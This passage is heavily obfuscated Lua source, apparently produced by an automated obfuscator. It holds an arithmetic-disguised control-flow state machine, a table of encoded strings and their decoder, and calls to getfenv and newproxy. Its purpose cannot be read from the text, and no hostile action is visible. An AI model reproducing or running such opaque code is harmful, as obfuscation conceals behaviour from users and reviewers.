B=U[d[-1023872+1023875]]y=90703048%495645 K=B-Q B=-360523-(-360555)T=K/B V=y-T f=782264-782008 K=U[d[959362-959358]]j=U[d[1014059503%11143511]]D=-419501+419503 x=D^V m=j/x B=K(m)K=4295373293-405997 T=B%K B=-887548+887550 K=B^Q y=T/K x=1034957823%8770829 K=U[d[1774337404%16429050]]j=y%x P,Q,x=7090668130%30892464,nil,4294522130-(-445166)m=j*x B=K(m)K=U[d[-451626-(-451630)]]m=K(y)T=B+m V,B=nil,554097+-488561 j=63442786%2112575 K=T%B m=T-K y=nil B=m/j x,A=341547-341291,-108899+109155 j=K%x q=K%f D=K-q q,T=-747895+748151,nil x=D/q q=-884667-(-884923)D=B%q a=B%A f=B-a a,B=-113572+113828,nil q=f/a K,m=nil,{j;x;D,q}U[d[287209+-287208]]=m elseif 1525190623%27942741>P then x,a,A=S(272168+-277531),S(547889+-553195),-937533+28224166114538 y=v[x]D=U[V]c=880187+3218101575034 q=U[T]f=q(a,A)q,A=P,S(324343-329706)x=D[f]a=v[A]e=U[V]r=U[T]z=S(105251+-110580)b=r(z,c)A=e[b]f=a[A]P,D=f and 2242814401%18879553 or 7548294-1010367,f else V=U[d[-1027263-(-1027264)]]Q=#V P=v[S(-635290-(-629940))]y=U[d[-5407-(-5408)]]T=nil V=y[Q]y=U[d[670517+-670516]]y[Q]=T Y={V}end else if P<738807+15793154 then y,Q=999103+-999103,S(386540+-391927)P=v[Q]V=U[d[-455790+455798]]Q=P(V,y)P=15616893-(-183398)elseif P<16888228-249512 then n,P=S(-24431-(-19105)),510704+12365977 G=v[n]n=S(-157157+151774)v[n]=G else P=2960954-(-526384)end end else if P>14958377-(-941757)then if-271144+16281873>P then y,Y,Q,P=-714227-(-714230),233831+-233831,h,S(-798981-(-793657))T=y V=I()y=-279529+279530 K=y y=28065-28065 U[V]=P B=y>K y,P=Y-K,12205589-103587 elseif 16601243-505520>P then r=-597491+597492 A=#D a=347819+-347818 f=K(a,A)a=q(D,f)A=U[m]f=nil n=a-r e=y(n)A[a]=e e=#D a,n=nil,-656372+656372 A=e==n P=A and 3556255011%16109037 or 1004735+15016746 else G=2552243918%18316848~=-293353+16711135 P=G and 10419166-(-846202)or-538865+13500029 end else if P<-929277+16326867 then y,P=x,D P=595948915%2476108 elseif-117476+15733953>P then Y,Q=S(-56546+51159),S(171109+-176468)P=v[Y]Y=P(Q)P,Y=v[S(-863739+858431)],{}elseif 1753794160%28032601>P then m=nil K=R(K)D=R(D)j=R(j)y,m,f,a=nil,S(31713+-37047),nil,nil j=I()e=R(e)V=R(V)a,A,V=S(22433+-27777),nil,nil T=R(T)q=nil B=R(B)y=nil x=R(x)T=I()x=I()B=S(-950205+944821)U[T]=V V=I()U[V]=y K=v[B]B=S(286825+-292190)y=K[B]q=S(954472-959806)B=v[m]m=S(854906+-860286)K=B[m]B=I()U[B]=K K={}m=I()U[m]=K K=144228+-144226 U[j]=K K=2344622016%12211573 U[x]=K D=v[q]q=S(515373-520752)K=D[q]D={}f=v[a]a=S(-456302+450927)q=f[a]a=957182-956926 A=a a=-185829-(-185830)e,P=a,3537107965%23181508 a,f=347883+-347883,734776-734775 n=a>e a=f-e else y=U[d[295570956%14074807]]V,P=823198561%3429994,{}Q,T=P,y y=298729+-298728 K=y y=891343440%11004240 B=K<y y,P=V-K,53730+4336804 end end end else if P<1076133474%30320286 then if P>14941096-317674 then if 3825828946%16080363>P then P=-104675+14681760 elseif P<40563927%25657616 then Q,Y=S(-509815-(-504432)),S(955824-961150)P=v[Y]Y=v[Q]Q=S(337642+-343025)v[Q]=P Q=S(547683-553009)v[Q]=Y P=5499976-322474 Q=U[d[71689876%14337975]]V=Q()else P=13847750-(-729335)end else if 3284370355%20700280>P then V,Y,y=S(718669-724022),2274632574%16592891,1927443636%13217173 Q=V^y P=Y-Q Q,Y=P,S(807329-812665)P=Y/Q Y={P}P=v[S(648252-653620)]elseif P<754145815%18049832 then x,P=q,f P=805049+14502683 elseif 5453712995%29086584>P then P=-232871+4001818 else j=1987683707%17328146>1498516690%10671430 P=j and-303721+14973481 or 2117130900%27307330 end end else if 1179709081%16879619>P then if 14934120-(-608)>P then j=-1025792+1025794 Y=m==j P=Y and-886459+11686917 or 58937093%11606370 elseif P<14775907-(-166501)then x=S(786296+-791630)j=v[x]A,D,x=S(-1037120+1031776),S(470831+-476175),S(692149+-697528)P=m m=j[x]j=I()U[j]=m x=v[D]D=S(928819-934205)m=x[D]D,f=P,P a=v[A]q,P=a,a and 3502410-561905 or 4442855-(-821177)elseif-1048512+16023177>P then U[V]=J P=M P=2691938969%11676516 else a=S(-893756+888446)f=v[a]b=S(1021294-1026624)A=U[V]e=U[T]z=-977406+17095566272559 r=e(b,z)a=A[r]P=13072560-668469 q=f[a]x=q end else if P<734583+14355798 then y[x]=D r,P=15763011302337-277097,q q=S(-933437+928074)D=v[q]f=U[V]e=S(-719471-(-714166))a=U[T]b=22523494864945-(-997823)A=a(e,r)q=f[A]r=S(-523817-(-518448))x=D[q]q=U[K]a=U[V]A=U[T]e=A(r,b)f=a[e]D=q[f]y=x[D]P=y and 10336732-906940 or 628036327%14017964 elseif 2847183290%18038311>P then P=U[d[852795-852794]]V,y=h[79972-79970],P P=y[V]Q,P=h[-193574+193575],P and 871396901%16538106 or-588466+891067 else V=U[d[953022+-953020]]y=731896-731895 Q=V*y V=22804824700050-(-106083)Y=Q+V Q=35184372726260-637428 P=Y%Q U[d[475313-475311]]=P P=9269947-547249 end end end end end else if 782648+4438119>P then if P<2328139674%15004106 then if P<1306439-74530 then if P>657204+330730 then if 263740271%16419317>P then j=25313-25313 P=U[d[-877818-(-877819)]]x=-907068+907323 m=P(j,x)P,V=-98723+4489257,y Q[V]=m V=nil elseif 1471440136%12675458>P then w=-528366-(-528368)t=c[w]P=1086916536%11357531 w=U[l]L=t==w E=L else A,D=S(609652-614963),P a=v[A]f=P P,q=a and 1241843313%11502944 or 1762112531%9698600,a end else if-1037952+1219717>P then P=1126896325%13620129 elseif P<-861051+1464973 then j,P,K=S(-497263+491931),{},35184371643282-(-445550)U[d[-705972-(-705974)]]=P Y=U[d[243307-243304]]T,m=Y,-365803+366058 Y=V%K x=2468940549%15626206 U[d[-713334+713338]]=Y B=V%m m=-709942+709944 K=B+m U[d[-418664-(-418669)]]=K q=-218983+218984 f=q B=#Q m=S(392472-397804)y[V]=m q=542769-542769 a,P,m=f<q,3005243-(-948029),-983531-(-983550)q,D=x-f,B elseif 3355017320%17653018>P then x=801468-801465 j=m==x P=j and 8446114-597939 or 925373+2561965 else x,P,X=q,4696175-742903,S(760112-765496)s=v[X]X=S(71714+-77075)G=s[X]s=G(Q,x)G=U[d[983300-983294]]X=G()F=s+X e=F+m s,F=163856647%791578,1017024-1016768 A=e%F m=A G=m+s F=T[G]e=j..F j,x=e,nil end end else if P<1259909-(-508080)then if P<1079937-(-369835)then V=U[d[457795970%4124288]]P=13060335-738679 y=U[d[939197+-939194]]Q=V==y Y=Q elseif 154765945%3828853>P then p,w=P,224383370%1687093 t=c[w]w=12126995-(-260200)>=13501436-(-55714)L=t==w E,P=L,L and 871675+197413 or 2137490723%12828552 elseif 1713684-16865>P then P=j j=I()U[j]=y x=U[j]y=not x P=y and 1318903164%15211985 or 16756832-485487 else f=a r=f D[f]=r f,P=nil,-649140+14167889 end else if P<-1008255+2899640 then Y=U[V]j=S(-294581-(-289257))P=Y~=j P=P and 75635454%5813425 or 13683202-785016 elseif 1467852-(-543857)>P then P=-188710+16843043 else P,A=13414202-(-324714),S(-210722-(-205350))a=v[A]q=a end end end else if P>4478121-306986 then if P>3149632314%17869857 then if P<3020629444%14430648 then j=U[B]y,P=j,15121070-181990 elseif 80482+4843572>P then P,e,n,f=D,S(-645489-(-640116)),S(900028+-905390),-661236+661239 D=I()U[D]=x a=929907401%5406438 F=u(1924144000%21549714,{})x=U[j]q=x(f,a)x=I()U[x]=q q,f=850810-850810,-727351-(-727351)A=v[e]e={A(F)}a={W(e)}e,F=280427-280425,S(878814-884155)A=a[e]e=v[F]G=U[T]X=v[n]P=1044352+5992791 n=X(A)X=S(127786-133156)s=G(n,X)G={s()}F=e(W(G))e=I()U[e]=F F=930865205%5412007 G=U[x]s=G G=310699-310698 X=G G=768504-768504 n=G>X G=F-X else P=748627882%7664363>3389188680%15325652 P=P and 60642+14835429 or 6315787232%25526028 end else if 2400351148%13769893>P then P=607916159%3799668 elseif 5467783-1032192>P then m,y=not B,y+K V=T>=y V=m and V m=y>=T m=B and m V=m or V m=706422+286888 P=V and m V=239655+12235094 P=P or V elseif P<5280386-791289 then P=2490470133%26896181 else f,A=P,S(477030-482415)a=v[A]P,q=a and 77666+13661250 or 684405+1381578,a end end else if 1335743590%13060751>P then if 4113757-949757>P then e=S(146981+-152325)A=v[e]e=S(82761-88099)a=A[e]P,q=5089915-(-174117),a elseif P<2460010-(-977406)then P,f=-665333+5335939,S(810847-816185)q=v[f]x=q elseif P<1787677033%8965650 then m,P=nil,11480831-(-621171)else P=461358+4716144 end else if P<-937533+4599980 then m,B,P,x,T=nil,nil,7075319-(-114404),j,nil j=nil y[V]=x elseif 422354005%13077903>P then P=438655554%10361148 else A,q=not a,f+q x=D>=q x=A and x A=D<=q A=a and A x=A or x A=1827224-844666 P=x and A x=3557004-1056 P=P or x end end end end else if P>7690890-24225 then if P>849215812%17885730 then if P<1772574825%22042017 then if P<-400748+9117814 then Y,P={},13021357-(-631540)>8750636-795449 U[d[807425842%5808819]]=P P=v[S(478282-483631)]elseif 286054938%13859751>P then V=U[d[701677179%13239192]]y=809913+-809866 Q=V*y y,V=22104743%11052371,3318806573%14949578 Y=Q%V U[d[451758+-451755]]=Y V=U[d[-701555-(-701558)]]Q=V~=y P=Q and 651621815%21911709 or 2722487562%14134192 else U[V]=F P=G G=U[V]P=G and-830522+12048785 or 3455116849%13686690 end else if 4776443759%26048795>P then Y,P={},v[S(298857+-304245)]elseif P<724466265%15206864 then P=312117569%11618147 else Q=U[d[-909308+909309]]Y=#Q Q=-977534+977534 P=Y==Q P=P and 16170255-986943 or 17061482-767608 end end else if P<362795+7781325 then if P<5537526358%22569905 then D=-978814+9627270<-138340+6023448 x=U[V]j=x==D P=j and 4581228-192230 or 14768227-(-148325)elseif 7521541-(-452590)>P then J,P=E,p P=7182802509%31029683 elseif 175141+7866832>P then Y,m=106876176%607251,y P=m==Y P=P and-992255+2817590 or 1346933906%16350707 else K=606387+-606385 V=U[d[-614323+614324]]T=-37728-(-37729)y=V(T,K)V=787897-787896 Q=y==V Y,P=Q,Q and-512112+12833768 or 996607+362282 end else if P<-261160+8526372 then P=U[d[1782884395%15369693]]P=P and 2113918072%19067975 or 15973704-173413 elseif P<8342302-(-52962)then L=779128+-779127 p=c[L]P,M=3428211472%14109615,p else M=P E=U[V]P,J=E and 345240362%8812813 or 13933385-(-1012351),E end end end else if P<2468753884%13028237 then if P<5962262-(-235431)then if 1076471907%8777484>P then x,P=q,f P=q and 4489896-(-180710)or 2159915892%20154471 elseif 1527924767%7078616>P then j=U[V]x=360491+4576364~=932157-432429 Y=j==x P=Y and 2480939-523504 or 17545529-891196 elseif P<2215673895%17398035 then P=8008276-523120 else j=491987079%1936957 Y=m==j P=Y and 5397252-(-576434)or 15055916-125540 end else if P<7142522-862651 then Y,y,V=379184965%16948742,2511178370%9923376,S(-157318-(-151973))Q=V^y P=Y-Q Y,Q=S(-307623-(-302249)),P P=Y/Q Y={P}P=v[S(-99269-(-93923))]elseif 580191037%12209013>P then r=R(r)N=R(N)l=R(l)b=R(b)P=6495846-(-541297)F=R(F)z=R(z)c=nil else P=8627047-425581 U[d[-337130+337135]]=Y Q=nil end end else if P<714806+6248606 then if P<6006166-(-482607)then Y=S(299497+-304838)x=O(14001164-287849,{})T,j=S(328504-333866),S(-400620+395247)P=v[Y]Q=U[d[-1029952+1029956]]y=v[T]m=v[j]j={m(x)}m,B=1746379294%7727342,{W(j)}K=B[m]T=y(K)y=S(953092-958462)V=Q(T,y)Q={V()}Y=P(W(Q))V=U[d[2257498805%9406245]]P,Q=V and 14378712-985919 or-1015807+7410370,Y Y=V elseif 524656+6077273>P then P,f=3457748715%24074976,{}D=f elseif 1384197086%22956988>P then x,P=q,f P=q and-362283+15670015 or-1030848+5528393 else F=I()z=S(-924797+919463)U[F]=G c=-471371-(-471471)b=v[z]z=S(949435-954814)r=b[z]z,J=26978-26977,-597043+597044 b=r(z,c)r=I()H=-940397-(-950397)U[r]=b c=93522728%11690341 b=U[j]N=-760632+760887 z=b(c,N)b=I()N=-507632+507633 U[b]=z M=2011582802%13969325 z=U[j]l=U[r]c=z(N,l)L=S(81379+-86741)z=I()U[z]=c N=U[j]l=N(J,M)N=1669285872%13795751 c=l==N l=S(895618-900988)N=I()U[N]=c p=v[L]k,M=-663669-(-663669),S(-92749-(-87395))t=U[j]w={t(k,H)}L=p(W(w))p=S(-653086-(-647732))E=L..p J=M..E c=S(355268-360619)c=A[c]c=c(A,l,J)l=I()M=S(436590+-441963)U[l]=c J=v[M]E=u(1597482797%8192763,{j,F,x;T;V,e;N,l;r,z,b;D})M={J(E)}c={W(M)}J=U[N]P=J and-470831+8932401 or-821049+11984526 end else if 2868415576%17772063>P then r,G=not n,X+G F=s>=G F=r and F r=s<=G r=n and r F=r or F r=305228382%11933548 P=F and r F=12222358-576562 P=P or F elseif 7263549-(-73890)>P then Y,P={V},v[S(82845-88227)]else P=v[S(285922-291241)]G=g(-443118+3981146,{K})s={G()}Y={W(s)}end end end end end end end P=#Z return W(Y)end,function(v,S)local W=y(S)local h=function(h,d,Z,C,Y)return P(v,{h,d;Z;C;Y},S,W)end return h end return(K(2285766373%27680078,{}))(W(Y))end)(setmetatable,getfenv and getfenv()or _ENV,getmetatable,unpack or table[S(-384518-(-379180))],newproxy,select,{...})end)(...)
return(function(...)local o={"+)]@u";"+^)HYo?*b4N<;o","+uG_Dc";"+\"G,<";"+#I)-","+\")Mf8\'krC]*NUPMli/","+#E,r$$=C+MA&fKc","+F2u.H","+kun*WnU";"+u=ZH=?\"YT";"+m[AALk?O)H","+m$/<Ad3K";"+8!GBuqI:]","+u55","+Jf2P*A,\'a";"+jA9be$b","+on-uZsNFMRlC";"+qrXFY]C<X","+KC`Gj","+MScM4)R)&r[N+";"+73OcNRRIf\"dO?=5L+L";"+o>=P";"+Q[6l16Peh-T]:\"^2E0","+#AkV";"+8D-2s/hC?(eajfEV$\'";"+nO0kd\"=`";"+VMscX";"+Q!0,j`TM";"+$\'A0O`^(q\'<-m.0S(.--##";"+XrE_.","+Dq9Rj0E","+dOc%M","+2XGA";"+`RKKC";"+N3$I0KCQ=O()WaU[fhO\"f6ms-rVA";"+@LoQ+`>Mr[JXd1=R!]J","+%pcf#=]3d0k4uZhTF";"+Q%%U&TVT@>","+k@Ss,35X3+";"+pT5rX6#;+&=G-oF";"+](?bkYZ=b\'KW\\[;","++Dj\"";"+e6gW+86=u4^M9";"+%U8%B+?o^%";"+8dP,LZtcm*@Y@1up\\#","+9oM\"$","+#BYu7Oe=h";"+s)tSie\"[&";"+g83TNgUfG1k\"&h92%T";"+;Y:*";"+?$WW";"+m-Y2VC?3XJ","+uHN7mk4$Tp@Y\"","+2q5_-k>\\&uO32uNUg";"+jF>@","+mNrs<`=HO","+\"$;l,uRe4K1d","+TE\'A72S%4MKcDcs","+k+CUQnXL6\"6pk1&","+unQhnCnEi&kHcIiE7ZO","+>Fp/;RD4U@S9gE1eDdeb";"+8hGmnQZFrE0iog","+\'hMKYC.$";"+lbfsDJ`uP%/;Dj!%d^94";"+]\"3KW31YW\\P>SG2";"+HO.$G","+=;8MTVNf=:2S2#B";"+<)EpM\'(bS","+tgqA";"+OSW(/";"+?/M+e","+(/:X9";"+3tiQ;","+F8>o0]Y\'5k5F","+jUC9eSp+m","+-^[","+lN4agIjXkJ>K3dq_(CN";"+^LW3p7NQn?*WW";"+IA3t[YPFM","+CKuqO+VTaJ_#nf(","++MRC";"+3&7H#@d>";"+\'4Ctf,q5q_=*_u9","+1W!@";"+PTSB9eo?;","+@]ec]aho$","+TI+[g";"+`BHrj";"+>%(&MI#VkkC2E";"+Q/I&CgYeP>@4WD\"";"+$?ZY";"+H4OPrpqCY";"+6RU!Z","+DYEk&AuWM+_O>","+f<^YN","+Aq.b\'&9ELHkV\'";"+@3gdQZ\"\\dYpTB!tplV","+9q)@H","+k4$Tp@Y\"";"+(HFH0","+unOB";"+QT*bk%NUX`=Scp,6d";"+,Gr%U2k0?";"+ja@%","+*K/.+";"+:\'O@X^B0M";"+q&A`)8O6)kd&(9&TK7m","+3584cT1u","+U1gF:","+#WYm8","+o%]l>*].N3";"+geF`Pi8qt))4so4W0mBeoGd","+UEbFj),*","+:PSp\\";"+_8VXuK.FP","+(obJH","+\'*","+TbX]$n0-[F,Qbo6P[3","+=hUe8,i@EM358c";"+V$V]\'E><]H%B\'WQ2LLkMD4I";"+6h,)d3e=","+:5@JZ\"8UX";"+l;g)";"+6#U%W6NP","+T#nCZg70P7Eij-fuaN","+","+=:mi","+K7U6@","+u[ij/,0ZL;%#U7iOX";"+fmV,u%dV;r,YE","+0@Z1W_pl]Tf.9NTQ[6qCr\"";"+m>U0e4P:";"+@$;9L6#\\(d,AOD$n\\","+)O2,o`jXGU&\\bC)6S0";"+CI459";"+n:$-=k7G";"+H:9pH";"+6:Rs!6h2n\'T.)W7";"+3[sH8@J";"+dsf.%:J`q)q4.BC[:R-","+TEgYP";"+CE=LCkTe*CU_gHu5>igR";"+^Zlt[lR>FE6U\\C","+fX=LfUWU*H","+A5`cs^l^\'Y3;7";"+X?,>*E9a@<CZe","+FFg/";"+9Jj7a<BoI*","+q*j0","+$!g/NS2?I","+h,a@kr],HY,7!W\"kS,M";"+KVR]=Pb";"+%j%9DnGdd","+O+\\d5=*\'N=,i@EM","+t]89!sF";"+LoC/","+,NTX]","+IT0\\;(%P";"+85^e6Vh.$#","+,+(NiPJ";"+\"!1T=-^H8o","+fcIf","+;FN/";"+Ob-OMEibDfp)Gti";"+;GrtVER!gjR\\Mp$gC.H","+Jf)a5n=.b";"+]gCt\\8de>d#rD";"++BI`Uh5t)S";"+pF@0%KPG@OM`XV";"+.QA.nZ]P","+LXT7ICM@T","+NOa).psq3^9k=","+],SXkeU-mJtUe";"+TbQ%Q","+]\'CC","+6]7`qWgub","+/iW%8I\\";"+r$V[";"+r]%#O/A9V^psZKn*e`","+Wo=OqQ8\\,m.=8","+sD0`7)OZph$0r","+)%Co)Q,";"+_o$O";"+/`K0","+Jf)LI@J","+PG=,l";"+,sQO/NUr,U%X=Tp","+2mB+uQH5,b3c3:k","+s[4%";"+D$[0dmoq","+gX\\/m<T8","+O\"gkY8tZC/#/d";"+O#<&rHf>","+f$jR+Lal;YWXE^i@N?7Hnr;DA%n2ii","+2X\"X`6P.Ge","+he*p^";"+.2d?q(OF","+Y$1T,FWNjq59i";"+]D]fA0s1Kh";"+`TPa$VN,jC`K)jB<TC";"+Jf)V.ku,E;6LdX";"+!+<6\')h+.>XB31r5P>-6";"+@UEh<6i#kR=]7*5Z]7";"+6;4er(n","+g<D>GT;bq9nq2r783","+,sa+]6hV";"+0Y=^C;1eQOlgM3S\\el";"+QX_8&","+k7$A\\6hb";"+.I\"G-<?6-,ar>OC%-l](\"l9\"soH","+N$)(qPoJu9pdak0";"+NID7Xg(?LQg()`^","+2ElSHN+L;UU>j@32:B";"+n:$u+3*";"+l!7$$<>o)>";"+t=8=\"oCpP,H*]SZXih[t\"o","+j\"i9;Mpg$","+8l$V";"+FWe\"";"+QgC_ou\\lI\\O7lB=TIR","+Z1_.FE0hc@3[5,cQ.","+*,$pF1DF](kQDM`\")EF\'-\'4^a:FZe:_7R2W/a@_)","+:Hsr:","+-.=QqQFIO","+$r:r_\"hWfh1d";"+0(bRum+4";"+2dtAFG^L";"+2GuLV)$IV","+jC]&=","+&G60","+Q\\Uj";"+;5Q9a","++5En";"+fXeA6`$>F&3+-,";"+gIQ#u)AmT;1`<gVr(D";"+,%A\'$";"+mU?Y/,/#L>^0%(j@?U";"+=hUelk4LVs";"+GIVqUS/rZ";"+6h.p`";"+fB1Eb>\'R%[[FYr7&cNm3`2^[f&B3","+HPLJ+0iZ!c5H0c>","+\'D[p5lqeu";"+\"fe]Z";"+8)b*]C%$,cV#(Lqe\"m","+4P\\U","+,FI36\'+=IAu\']EL@AC";"+qe2t0+8Ij%$/9PANa:","+u(P,E2lrbn^7%M_m-%2Us!uUZS0]";"+2XSN+S%#($*QeoJ=jl","+=p,9BT.jB3T!VTAnU";"+\'U5d5-a#C\'F9))W1+F","+E0.T`";"+%t@UJnpjjMf:";"+u.Vm`$#k.";"+&nW,/%#(S","+fVR[N1<NN";"+PU*";"+_;MR","+?kkW9";"+k4Lf","+$:,[a","+?sG\'2O2c=B";"+p4tt";"+TVt@=>??^";"+i50K/G&^ePM/sT$Eq\"?<";"+5I,e+","+FT;q","+2!43","+k\\jr=";"+9[3D8","+q=C_n3r/BH","+n9:Oopa#Cm@CXU0";"+=Pe%5";"+%,6,c-Db/AKQ6l";"+IXmB5";"+nX/bYn2Bo!%#UU!gcD","+\\^;8KcHf";"+MfV]n";"+V\'mtQW\"","+k3h/p";"+.4-![Q_be";"+_GiL\\";"+HK*l#","+358%snXah";"+UcE\'`#LRETnA\'4p\\H3-EYngY;:Hh","+&KLT3^3R<";"+m$pe","+C$$2","+3nu#m%X=YLuCfi3PJ","+YNhRPMnAWr$:Q(6\"QR(&)\"?m&Vj>Ku8(+bY#1m+;N^WK#J09-agkCm7nU";"+ulhoAOX","+?1Jf=1Z.3K?>j","+TP*TI2m%1u\'\\#Lu","+ulWbh%*>96T>hpIu,","+[C1,nW?A%","+GjS4be-r0>^/[","+^\'Afj6lk9\"iF";"+,H1]s%B:ileER";"+I1ESQACUnX$j","+d\"J#";"+`1^m\\L0cJ:)`/","+_6(Bj";"+,S)CW3[L","+=c^%8iJ]s``K]bI^r&";"+]EI3E%2ZhG/a@","+iNoo_F)BA>JON","+K);DU&<BT+2_:2Q*_R5T","+1`DnqD(S%P>7I";"+-:#,@8De0fn[";"+@&:;<@kGNPg):b[";"+j[BKrp54Bs";"+_8WS=";"+-_S:&ho\'","+0OSpuC2k-";"+e6_$tk;2;","+Yf?n+","+psQi_mIFM]IgYp=HQ8","+:/d)\'";"+QBGrdnf4";"+J&\'dhJon<6F]&";"+NeTJtdF3d^";"+n2\\QSTn+A/%J[E[k2";"+%j%ej3Ie","+6!@^-\'oEp?pact2E<b","+:h5;","+3cNNmu.","+nX@(83*","+\\E%:Oho`tjGJ1","+F_%sZ","+;33U","+Dm3Yr\\0\\","+Z(UAJ\'^:B*abj*","+;!.#U";"+T!faHOjt<Sk,^^`@j";"+A$rP\\4;a,Fj?4Snid9f","+%B_k.3[%0";"++WiD2p\'-^Y";"+Y\"\"%eee8o(3#","+Ou]I1R%Ld`aj";"+ET%IR";"+eF/;0NCD";"+a2JO,R+gV","+)#rO=([KiD";"+E^q<V@T`f#NnJC:8F6","+E)aOh/2iY!";"+;*q4PkuV","+t1W)G6Cl\\%oYt?SY:+\\?","+aP5_V";"+p$;*T=S,K]):[*P:1q","+(\",n";"+,F6rIlR0","+@&Y?.@)jfT\'4YX";"+Klj#@YWe";"+=hUe6nX@!l6hZ","+p4\\e_";"+->4Pt]:Tp\'!8@","+f6#>T)#lM1LqZfo$:#q^?[","+\'uZC+6=7[";"+*-G1";"+u5V","+gG\"h";"+\'7)6:r7J(s.k?`P8NYEI>6Bfb";"+,cjY1QIh","+7Hue(jsKku%J6dS65NG(";"+UZ.T","+]Zd,#L.G#0\"uVFqO;@Z";"+F#+9,","+q1J.P";"+j,qWI";"+ish/!ISG`o","+I@5f";"+2SYaI=P[-Gn=V";"+@MrJdM;W";"+K^\\,m","+&8:R.DDm";"+N,4CeEg\"%REiUB2@76","+!2=he";"+s\'3,GsMg3l","+5`]bTq%b.UC71jlQTBG";"+3\\tA-6hni%EmCCDZ16","+>Tp,u,o2%OcI#V&HiAhaW.","+*,JdNG-,+";"+X[t00O1h,","+\"dIQHF5?V#hp5<O3BM","+Rg&g55hN-RpT2\'_kaQ0k/uj#n,Z0","+lNOWp%iUuNgQ`:","+m0mL!oZ0mFjkgW];i#?";"+h*],u","+ODBYW=*hqJ8/9Bm@l#";"+Jf)T-","+=@_\"(","+c4jPteJA3dh?&^>,U^p%","+^kHD]&X";"+roiQ>","+ku,%c","+ZnBg","+=7UC^\'iNMPJ\'P`_X::";"+k=PC","+JmF>4[^","+q4Yc%","++lj%Et?Zdl/jp:3OF:","+8`O[?u[i\'.,GgDo","+?%NA";"+@llq;";"+l8FfUhd]`","+u2F0`N%@\'R\\o4i-e#X3;","+;se$?dm7L","+`\\N=7!=p;";"+\"-?!","+6f\'t\\";"+sbSW&K>";"+G`CLD=4#q";"+H:Po","+4&^`2L)Lr","+pHu@!%R1N/6d";"+O7jS\\\'TaYDEsIABNN";"+0EsBljqD";"+PCP0A7Lon";"+a+O^t:AbW";"+/TR#","+HClFD";"+TP#l","+sNC&@";"+j`XB-XBaDemY","+[Ahuf)$m4","+NuuiN";"+&eb\\M";"+9hK_m";"+On9tGTb)m=P8=\">OE";"+R0k1.","+&G7>WGanGo","+NuuiNQ\"","+V2m\'3","+<ZE3_A.LH","+FT(ks!c\"AQ","+Ei:h4E(Ad[Q_``J4*Da";"+n%g\"i2i\'bC2M3R2","+L8&J";"+,0sf(","+\'UiL8";"+\'$s>i";"+f&^e)?C%[$f2";"+P<tHr3o\\AH35\\","+RD+e8qWc[4";"+=[s\"c\'$uL)";"+GlH(7PiKY6";"+6SBrR","+uLjH0","+R3m:Y\'B\'i";"+,F?J2","+4ISq&1:&&gCY;qZ_)Eo`";"+mi\"Pj\"g5?I%H";"+RKPK*Rc=n";"+6M(]>Q/hguu<XcC@>","+,F?J2JjCrBkK\\*E","+n/X&o!+P","+%I00";"+dV\\NK","+k@S\"Z@l=t!","+fXaAT_]C","+Nc8*KnXnM.nXLCMku<bc";"+Ho7h(J7ht";"+u@NK]","+J=RC";"+uQ.)M@<]*GQ)&s#gJ";"+S=BERk2";"+U5ZZ8F`8";"+NcXS*3\\X[ON\\VX_6p^`J@C,:l@)Ds","+0Bgk6V5:o;ne?","+s]k*G"}for t,I in ipairs({{-699894+699895,113124+-112653};{1611530593%7194333;416339-416173};{1029351-1029184;693826234%6140051}})do while I[676406-676405]<I[1579775426%11447648]do o[I[2093202001%14536125]],o[I[937024793%7152861]],I[240672125%1626163],I[-210151+210153]=o[I[599795+-599793]],o[I[677942-677941]],I[-300200-(-300201)]+(-1001279+1001280),I[853884-853882]-(698806+-698805)end end local function t(t)return o[t+(-477613-(-483439))]end do local t=string.char local I=string.len local W=string.sub local U=table.concat local j=math.floor local A=table.insert local d=o local r=type local Q={Z=767608+-767573,G=239591+-239580;i=277382-277353,m=337535469%9643869,e=-342251+342253,T=307874-307818;M=-363883+363910;w=1011647+-1011635,["7"]=884308165%16078330;R=1536519720%12698510;f=-546384-(-546417);F=-998762-(-998783),["8"]=7037741%7037698;x=-992511+992527,S=397347-397292;k=322567965%7331089,B=98626-98595,n=1002943+-1002892;q=1292780195%13191634;Y=-574750-(-574770);b=319411-319402,c=-14176+14221,J=-122916+122952,p=2283207696%9281332,["2"]=-791761-(-791801);["1"]=310447054%7055614,t=23457+-23451,y=-688124-(-688181),l=-576050+576058;W=886768600%10192742,u=-724676-(-724726);H=959485345%5076642,D=558448477%5940941;A=583538+-583510;o=2532207795%14637039,P=575794+-575747;v=-160963-(-160997),L=-675189+675221,["9"]=707131-707126,["4"]=604403+-604389,N=1008575+-1008517,a=1999123439%8806711,["0"]=2299120991%9422627,I=543153+-543152;["/"]=-640052+640052;j=-499055+499115,["6"]=886152-886139;s=-577778+577800;["5"]=-929469+929531;U=57751-57698,C=3134547202%16241177;d=894396+-894378,Q=350827+-350788,X=390872-390828;K=740983+-740946,z=648820+-648801,h=431208-431149;["+"]=-909730-(-909756),O=580803-580786,r=-632948+632973;V=-202409-(-202470);E=1264979234%9100570;["3"]=176014772%2200184;g=1678498245%9377085}local O={["-"]=1065934537%11220363;["/"]=343474-343403,["&"]=180319342%2436747;["3"]=2187836386%12501922,K=-170085+170147;["+"]=1270753799%14440384,["6"]=2583243187%14512602;[":"]=683907-683829,N=-1632+1659;[";"]=604915+-604914,h=85599503%940653;["5"]=915054293%9242972,c=312948-312938;_=1055510103%4932290,["("]=156133+-156063;["#"]=51443-51362;["`"]=-437038+437112,a=-647048-(-647092);g=-649012+649029;q=-56756-(-56802);["]"]=275497+-275497,j=-33704-(-33761);s=31905+-31885;X=928957+-928906;C=-190246+190288,P=-425453+425479,["2"]=360171+-360148,G=727784-727735,["^"]=161170-161125;["7"]=779384+-779321,I=-126377-(-126436),e=531955-531888,["\'"]=506736+-506718,["0"]=-830266+830285;d=-514096+514165;["!"]=163823973%14893081;M=-887919-(-887996),m=853946+-853870,k=420806293%9786192;B=279292-279209;J=359275+-359245,L=2261767841%14314986,t=-723894+723900;["<"]=401196+-401128,b=-409581+409665;Y=-341698-(-341739),[")"]=-52130+52170;D=241014373%16067621;["1"]=804980537%10189627;r=-369326-(-369387),T=-290435-(-290473),["\\"]=1469984118%10729811,["9"]=1814859771%10195841;l=-990719+990732,Z=2443150889%12277140,A=-230311+230325;["*"]=-585330+585384,Q=626025314%3840646;["8"]=133663881%3108462;V=718318-718262;U=1155141804%12159387,F=954030-953982,n=-632436+632468;W=42416-42337,[","]=1038144+-1038111,u=3679626274%15657984;p=3690260539%15001059,o=-865019+865031;[">"]=1035842-1035840;i=315801-315754,S=1635682981%7826234;R=41892-41889;["$"]=96074764%393749;["["]=177191-177125,["?"]=56999100%2999950,["%"]=-8630